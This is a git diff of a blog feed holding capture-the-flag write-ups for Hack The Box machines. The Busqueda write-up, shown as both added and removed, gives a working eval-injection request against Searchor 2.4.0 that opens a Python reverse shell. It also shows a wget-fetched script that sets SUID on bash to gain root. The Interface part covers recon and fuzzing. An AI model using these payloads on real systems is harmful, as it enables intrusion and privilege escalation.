class=&quot;language-plaintext highlighter-rouge&quot;&gt;vulnlab&lt;/code&gt;. From what I’ve explored, I have to say that I am really impressed with it and so far, I really like it. Here is my writeup for the “Baby” lab.&lt;/p&gt;
 
 &lt;p&gt;https://www.vulnlab.com/&lt;/p&gt;
 
@@ -543,7 +883,54 @@ I had only a single entry point that could give me output which was through &lt;
 
 &lt;p&gt;There are issues with that exploit, I believe it is in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wait&lt;/code&gt; mechanism. To make sure that it is working correctly add a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;breakpoint()&lt;/code&gt; in the beginning of the script then you can follow the execution by pressing “n”.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/htb/htb-sandworm-firejail.png&quot; alt=&quot;rwojak&quot; /&gt;&lt;/p&gt;</content><author><name>Dimitar Ganev</name></author><category term="ctf-writeup" /><summary type="html">I began with a simple scan, to check the ports of the machine.</summary></entry><entry><title type="html">Hack The Box - Escape [Medium]</title><link href="http://localhost:4000/ctf-writeup/2023/06/10/htb-escape.html" rel="alternate" type="text/html" title="Hack The Box - Escape [Medium]" /><published>2023-06-10T00:00:00+03:00</published><updated>2023-06-10T00:00:00+03:00</updated><id>http://localhost:4000/ctf-writeup/2023/06/10/htb-escape</id><content type="html" xml:base="http://localhost:4000/ctf-writeup/2023/06/10/htb-escape.html">&lt;p&gt;This is a Windows Machine which is part of an Active Directory. I would try my best to explain the stuff that I did, since that I’ve seen pretty bad write-ups that are not explaining anything. I also want to be honest, and I will link every write-up that I used to exploit the machine.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/htb/htb-sandworm-firejail.png&quot; alt=&quot;rwojak&quot; /&gt;&lt;/p&gt;</content><author><name>Dimitar Ganev</name></author><category term="ctf-writeup" /><summary type="html">I began with a simple scan, to check the ports of the machine.</summary></entry><entry><title type="html">Hack The Box - Busqueda [Easy]</title><link href="http://localhost:4000/ctf-writeup/2023/06/10/htb-busqueda.html" rel="alternate" type="text/html" title="Hack The Box - Busqueda [Easy]" /><published>2023-06-10T00:00:00+03:00</published><updated>2023-06-10T00:00:00+03:00</updated><id>http://localhost:4000/ctf-writeup/2023/06/10/htb-busqueda</id><content type="html" xml:base="http://localhost:4000/ctf-writeup/2023/06/10/htb-busqueda.html">&lt;p&gt;This machine is rather simple, upon scanning it we can see that the website has a generating search query URLs input form. On the bottom of the page, we can see the versions of the used software:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Powered by Flask and Searchor 2.4.0
+
+$ whatweb 
+Bootstrap[4.1.3], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.1.2 Python/3.10.6], IP[10.10.11.208], JQuery[3.2.1], Python[3.10.6], Script, Title[Searcher], Werkzeug[2.1.2]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A simple google search would yield a bug that has been removed in Searchor 2.4.2+ and before that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eval()&lt;/code&gt; was used in the Searchor CLI module. Assuming that the website uses that, we can send the following payload:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /search HTTP/1.1
+Host: searcher.htb
+Content-Length: 67
+Cache-Control: max-age&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0
+Upgrade-Insecure-Requests: 1
+Origin: http://searcher.htb
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Windows NT 10.0&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Win64&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; x64&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; AppleWebKit/537.36 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;KHTML, like Gecko&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Chrome/110.0.5481.78 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.9,image/avif,image/webp,image/apng,&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.8,application/signed-exchange&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b3&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.7
+Referer: http://searcher.htb/
+Accept-Encoding: &lt;span class=&quot;nb&quot;&gt;gzip&lt;/span&gt;, deflate
+Accept-Language: en-US,en&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.9
+Connection: close
+
+&lt;span class=&quot;nv&quot;&gt;engine&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Accuweather&amp;amp;query&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;,copy_url=__import__(&apos;&lt;/span&gt;os&lt;span class=&quot;s1&quot;&gt;&apos;).system(&quot;&quot;&quot; python3 -c &apos;&lt;/span&gt;import socket,subprocess,os&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;socket.socket&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;socket.AF_INET,socket.SOCK_STREAM&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;s.connect&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;myip&amp;gt;&quot;&lt;/span&gt;,4444&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;os.dup2&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s.fileno&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;,0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; os.dup2&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s.fileno&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;,1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;os.dup2&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s.fileno&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;,2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;import pty&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; pty.spawn&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;bash&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos; &quot;&quot;&quot;))
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This would create a reverse shell to the machine.&lt;/p&gt;
+
+&lt;p&gt;The currently used user is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svc&lt;/code&gt; upon running&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We can see that we can use this command:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect &amp;lt;format&amp;gt; &amp;lt;container_name&amp;gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I also discovered the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/scripts&lt;/code&gt; folder that had some scripts inside, including &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;full-checkup.sh&lt;/code&gt;, I’ve run the command in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/scripts/&lt;/code&gt; folder, and it successfully retrieved some information about the currently running services, I tried to run it in a different folder, and it gave me &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Something went wrong&lt;/code&gt;, I’ve created a dummy &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;full-checkup.sh&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod +s /bin/bash&lt;/code&gt; contents inside and ran the command again, it just printed out &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[+] Done&lt;/code&gt; and after that a simple &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bash -p&lt;/code&gt; gave me root user.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; wget http://&amp;lt;ip&amp;gt;:8000/full-checkup.sh &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x ./full-checkup.sh 
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;bash &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/root.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Dimitar Ganev</name></author><category term="ctf-writeup" /><summary type="html">This machine is rather simple, upon scanning it we can see that the website has a generating search query URLs input form. On the bottom of the page, we can see the versions of the used software:</summary></entry><entry><title type="html">Hack The Box - Escape [Medium]</title><link href="http://localhost:4000/ctf-writeup/2023/06/10/htb-escape.html" rel="alternate" type="text/html" title="Hack The Box - Escape [Medium]" /><published>2023-06-10T00:00:00+03:00</published><updated>2023-06-10T00:00:00+03:00</updated><id>http://localhost:4000/ctf-writeup/2023/06/10/htb-escape</id><content type="html" xml:base="http://localhost:4000/ctf-writeup/2023/06/10/htb-escape.html">&lt;p&gt;This is a Windows Machine which is part of an Active Directory. I would try my best to explain the stuff that I did, since that I’ve seen pretty bad write-ups that are not explaining anything. I also want to be honest, and I will link every write-up that I used to exploit the machine.&lt;/p&gt;
 
 &lt;p&gt;I am still learning Active Directory at the time of writing this, so there might be errors, I will do my best to mitigate that!&lt;/p&gt;
 
@@ -737,210 +1124,4 @@ M* PS C:\Users\Administrator\Documents&amp;gt; gc ../Desktop/root.txt
   &lt;li&gt;https://yu8pentest.blogspot.com/2023/02/escape.html&lt;/li&gt;
   &lt;li&gt;https://medium.com/@Kushagra007/writeup-escape-hackthebox-dbee2d761d15&lt;/li&gt;
   &lt;li&gt;https://breached.vc/Thread-Escape-HTB-Discussion?highlight=escape&lt;/li&gt;
-&lt;/ul&gt;</content><author><name>Dimitar Ganev</name></author><category term="ctf-writeup" /><summary type="html">This is a Windows Machine which is part of an Active Directory. I would try my best to explain the stuff that I did, since that I’ve seen pretty bad write-ups that are not explaining anything. I also want to be honest, and I will link every write-up that I used to exploit the machine.</summary></entry><entry><title type="html">Hack The Box - Busqueda [Easy]</title><link href="http://localhost:4000/ctf-writeup/2023/06/10/htb-busqueda.html" rel="alternate" type="text/html" title="Hack The Box - Busqueda [Easy]" /><published>2023-06-10T00:00:00+03:00</published><updated>2023-06-10T00:00:00+03:00</updated><id>http://localhost:4000/ctf-writeup/2023/06/10/htb-busqueda</id><content type="html" xml:base="http://localhost:4000/ctf-writeup/2023/06/10/htb-busqueda.html">&lt;p&gt;This machine is rather simple, upon scanning it we can see that the website has a generating search query URLs input form. On the bottom of the page, we can see the versions of the used software:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Powered by Flask and Searchor 2.4.0
-
-$ whatweb 
-Bootstrap[4.1.3], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.1.2 Python/3.10.6], IP[10.10.11.208], JQuery[3.2.1], Python[3.10.6], Script, Title[Searcher], Werkzeug[2.1.2]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;A simple google search would yield a bug that has been removed in Searchor 2.4.2+ and before that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eval()&lt;/code&gt; was used in the Searchor CLI module. Assuming that the website uses that, we can send the following payload:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /search HTTP/1.1
-Host: searcher.htb
-Content-Length: 67
-Cache-Control: max-age&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0
-Upgrade-Insecure-Requests: 1
-Origin: http://searcher.htb
-Content-Type: application/x-www-form-urlencoded
-User-Agent: Mozilla/5.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Windows NT 10.0&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Win64&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; x64&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; AppleWebKit/537.36 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;KHTML, like Gecko&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Chrome/110.0.5481.78 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.9,image/avif,image/webp,image/apng,&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.8,application/signed-exchange&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b3&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.7
-Referer: http://searcher.htb/
-Accept-Encoding: &lt;span class=&quot;nb&quot;&gt;gzip&lt;/span&gt;, deflate
-Accept-Language: en-US,en&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.9
-Connection: close
-
-&lt;span class=&quot;nv&quot;&gt;engine&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Accuweather&amp;amp;query&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;,copy_url=__import__(&apos;&lt;/span&gt;os&lt;span class=&quot;s1&quot;&gt;&apos;).system(&quot;&quot;&quot; python3 -c &apos;&lt;/span&gt;import socket,subprocess,os&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;socket.socket&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;socket.AF_INET,socket.SOCK_STREAM&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;s.connect&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;myip&amp;gt;&quot;&lt;/span&gt;,4444&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;os.dup2&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s.fileno&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;,0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; os.dup2&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s.fileno&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;,1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;os.dup2&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s.fileno&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;,2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;import pty&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; pty.spawn&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;bash&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos; &quot;&quot;&quot;))
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;This would create a reverse shell to the machine.&lt;/p&gt;
-
-&lt;p&gt;The currently used user is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svc&lt;/code&gt; upon running&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;We can see that we can use this command:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect &amp;lt;format&amp;gt; &amp;lt;container_name&amp;gt;
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;I also discovered the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/scripts&lt;/code&gt; folder that had some scripts inside, including &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;full-checkup.sh&lt;/code&gt;, I’ve run the command in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/scripts/&lt;/code&gt; folder, and it successfully retrieved some information about the currently running services, I tried to run it in a different folder, and it gave me &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Something went wrong&lt;/code&gt;, I’ve created a dummy &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;full-checkup.sh&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod +s /bin/bash&lt;/code&gt; contents inside and ran the command again, it just printed out &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[+] Done&lt;/code&gt; and after that a simple &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bash -p&lt;/code&gt; gave me root user.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; wget http://&amp;lt;ip&amp;gt;:8000/full-checkup.sh &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x ./full-checkup.sh 
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;bash &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/root.txt
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Dimitar Ganev</name></author><category term="ctf-writeup" /><summary type="html">This machine is rather simple, upon scanning it we can see that the website has a generating search query URLs input form. On the bottom of the page, we can see the versions of the used software:</summary></entry><entry><title type="html">Hack The Box - Interface [Medium]</title><link href="http://localhost:4000/ctf-writeup/2023/06/08/htb-interface.html" rel="alternate" type="text/html" title="Hack The Box - Interface [Medium]" /><published>2023-06-08T00:00:00+03:00</published><updated>2023-06-08T00:00:00+03:00</updated><id>http://localhost:4000/ctf-writeup/2023/06/08/htb-interface</id><content type="html" xml:base="http://localhost:4000/ctf-writeup/2023/06/08/htb-interface.html">&lt;p&gt;The most important in this machine would be the enumeration, it exploits vulnerabilities like:&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://snyk.io/blog/security-alert-php-pdf-library-dompdf-rce/&quot;&gt;CVE-2022-28368&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid&quot;&gt;Executing files with sudo privileges&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;recon&quot;&gt;Recon&lt;/h2&gt;
-
-&lt;p&gt;I started with just the website &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;interface.htb&lt;/code&gt; where there isn’t much going on, from what I gathered I saw that it was a Next.js application, but the interesting thing there were the headers.&lt;/p&gt;
-
-&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;ne&quot;&gt;OK&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;nginx/1.14.0 (Ubuntu)&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Date&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Tue, 14 Feb 2023 08:44:41 GMT&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;text/html; charset=utf-8&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;close&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Content-Security-Policy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;script-src &apos;unsafe-inline&apos; &apos;unsafe-eval&apos; &apos;self&apos; data: https://www.google.com http://www.google-analytics.com/gtm/js https://*.gstatic.com/feedback/ https://ajax.googleapis.com; connect-src &apos;self&apos; http://prd.m.rendering-api.interface.htb; style-src &apos;self&apos; &apos;unsafe-inline&apos; https://fonts.googleapis.com https://www.google.com; img-src https: data:; child-src data:;&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;X-Powered-By&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Next.js&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;ETag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;i8ubiadkff4wf&quot;&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Vary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Accept-Encoding&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;6359&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;I saw the CSP header which has a bunch of websites in, and frankly I didn’t spot the subdomain at first, but that was the next pivoting point &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://prd.m.rendering-api.interface.htb&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Going to the subdomain, you are greeted by a single &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;File not Found&lt;/code&gt; text with a 404 status. Here comes the tricky part, the usual reconning using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffuf,feroxbuster&lt;/code&gt; and such, are ignoring the 404 status over the things it finds, and it’s tricky to set something that is working for this particular case.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ffuf -w ~/Tools/SecLists/Discovery/Web-Content/common.txt -u http://prd.m.rendering-api.interface.htb/FUZZ -mc all -fs 0
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;I found several endpoints that are returning more than just 404.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;api/experiments/configurations [Status: 404, Size: 50, Words: 3, Lines: 1...
-api/experiments         [Status: 404, Size: 50, Words: 3, Lines: 1, Duration: 
-api                     [Status: 404, Size: 50, Words: 3, Lines: 1, Duration: 
-vendor                  [Status: 403, Size: 15, Words: 2, Lines: 2, Duration: 
